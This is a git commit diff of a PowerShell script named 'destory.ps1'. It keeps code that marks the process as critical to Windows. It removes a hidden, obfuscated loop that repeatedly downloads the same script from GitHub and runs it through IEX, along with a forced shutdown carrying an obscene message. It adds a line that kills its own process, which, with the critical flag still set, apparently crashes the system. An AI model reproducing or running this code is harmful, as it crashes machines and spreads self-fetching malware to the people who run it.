2b9a96e961bc0227d9a2cf1002f347670b8f664b
43a1723 <hai1723notgay@gmail.com>
2025-04-10 14:58:48 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -14,12 +14,6 @@ Add-Type -TypeDefinition $code
 
 # Đánh dấu process là Critical
 [CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
-[console]::Beep(4000, 100)   # Tần số 4000Hz, kéo dài 100ms
-shutdown /s /t 120 /c "Fuck you!!!"
-while ($true) {
-    $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-    Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-}
+Stop-Process -Id $PID -Force
 
 
